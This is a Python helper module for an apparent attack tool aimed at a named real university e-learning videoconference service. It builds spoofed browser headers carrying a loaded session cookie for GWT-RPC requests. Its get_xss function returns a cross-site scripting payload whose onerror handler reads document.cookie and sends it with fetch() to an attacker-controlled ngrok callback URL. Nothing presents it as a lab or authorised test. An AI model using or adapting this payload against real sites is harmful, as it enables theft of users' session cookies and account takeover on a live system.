from helper import load_json_cookie

TARGET_URL = "https://e-class.tsu.ru/videoconference/service/conferencesession"


def get_base_headers():

    cookie = load_json_cookie()
    BASE_HEADERS = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "text/x-gwt-rpc; charset=UTF-8",
        "Cookie": cookie,
        "Host": "e-class.tsu.ru",
        "Origin": "https://e-class.tsu.ru",
        "Referer": "https://e-class.tsu.ru/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36",
        "X-GWT-Module-Base": "https://e-class.tsu.ru/videoconference/",
        "X-GWT-Permutation": "2EE328716505F2300378C659B943CE2B",
        "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "YaBrowser";v="24.4", "Yowser";v="2.5"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    return BASE_HEADERS

def get_headers(cookie):

    
    BASE_HEADERS = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "text/x-gwt-rpc; charset=UTF-8",
        "Cookie": cookie,
        "Host": "e-class.tsu.ru",
        "Origin": "https://e-class.tsu.ru",
        "Referer": "https://e-class.tsu.ru/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36",
        "X-GWT-Module-Base": "https://e-class.tsu.ru/videoconference/",
        "X-GWT-Permutation": "2EE328716505F2300378C659B943CE2B",
        "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "YaBrowser";v="24.4", "Yowser";v="2.5"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    return BASE_HEADERS


# CALLBACK_URL = "https://your-ngrok-url.ngrok-free.app"


def get_xss(CALLBACK_URL):
    XSS_PAYLOAD_TEMPLATE = (
        """<img src="scs" onerror="var cookie = document.cookie;fetch('"""
        + CALLBACK_URL
        + """' + cookie,{method: 'get', headers: new Headers({'ngrok-skip-browser-warning': '69420'})}).then( () => {console.log('hapi')})">"""
    )
    return XSS_PAYLOAD_TEMPLATE
